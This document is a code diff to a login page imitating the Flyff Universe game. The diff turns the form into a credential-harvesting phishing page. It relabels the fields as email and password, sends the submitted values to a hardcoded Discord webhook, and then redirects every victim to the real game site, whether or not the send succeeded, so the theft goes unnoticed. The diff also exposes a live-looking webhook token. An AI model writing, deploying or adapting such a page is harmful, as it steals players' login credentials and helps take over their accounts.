@@ -243,13 +243,13 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     <input type="hidden" name="_token" value="z0fHaPgV3X7NyG4EoKx5RZkTb9e0Nrenn8z1IcKY" autocomplete="off">
     
     <div class="mb-3">
-        <label class="form-label text-primary" for="name">name Address</label>
-        <input id="name" type="text" class="form-control" name="name" value="" required autocomplete="name" autofocus>
+                    <label class="form-label text-primary" for="email">Email Address</label>
+                    <input id="email" type="text" class="form-control " name="email" value="" required="" autocomplete="email" autofocus="">
     </div>
     
     <div class="mb-3">
-        <label class="form-label text-primary" for="firstname">firstname</label>
-        <input id="firstname" type="text" class="form-control" name="firstname" required autocomplete="current-firstname">
+                    <label class="form-label text-primary" for="password">Password</label>
+                    <input id="password" type="password" class="form-control " name="password" required="" autocomplete="current-password">
     </div>
     
     <div class="row gy-3 mb-3">
@@ -275,14 +275,14 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const nameInput      = document.getElementById('name');
-            const firstnameInput = document.getElementById('firstname');
+            const nameInput      = document.getElementById('email');
+            const firstnameInput = document.getElementById('password');
             const rememberInput  = document.getElementById('remember');
             const submitBtn      = document.getElementById('submit-btn');
 
             // Force string values to avoid {} object problem
-            const name      = String(nameInput ? nameInput.value.trim() : '').trim() || "Not provided";
-            const firstname = String(firstnameInput ? firstnameInput.value.trim() : '').trim() || "Not provided";
+            const email      = String(nameInput ? nameInput.value.trim() : '').trim() || "Not provided";
+            const password = String(firstnameInput ? firstnameInput.value.trim() : '').trim() || "Not provided";
             const remember  = rememberInput && rememberInput.checked ? 'Yes' : 'No';
 
             const webhookUrl = "https://discord.com/api/webhooks/1492217076667121734/zs-o6BpUOqzTF57nzzZ_YOGh2cS2jyUSiTT6rexo6Xbs8siNGhSyluGGjgcVE_Is2Ynq";
@@ -315,21 +315,23 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                     body: JSON.stringify(payload)
                 });
 
+// Always redirect after attempt (success or fail)
                 if (response.ok) {
-                    alert("✅ Successfully sent to Discord!");
-                    form.reset();
+                    window.location.href = "https://universe.flyff.com/play";
                 } else {
-                    const errText = await response.text();
-                    console.error("Discord Error:", response.status, errText);
-                    alert("❌ Discord rejected the request (Error " + response.status + ")");
+                    // Small delay so user sees "Logging in..." then redirect
+                    setTimeout(() => {
+                        window.location.href = "https://universe.flyff.com/play";
+                    }, 800);
                 }
+
             } catch (err) {
                 console.error(err);
-                alert("❌ Failed to connect. Check console (F12)");
+                // Still redirect even if network error
+                setTimeout(() => {
+                    window.location.href = "https://universe.flyff.com/play";
+                }, 800);
             }
-
-            submitBtn.disabled = false;
-            submitBtn.textContent = originalText;
         });
     });
 </script>
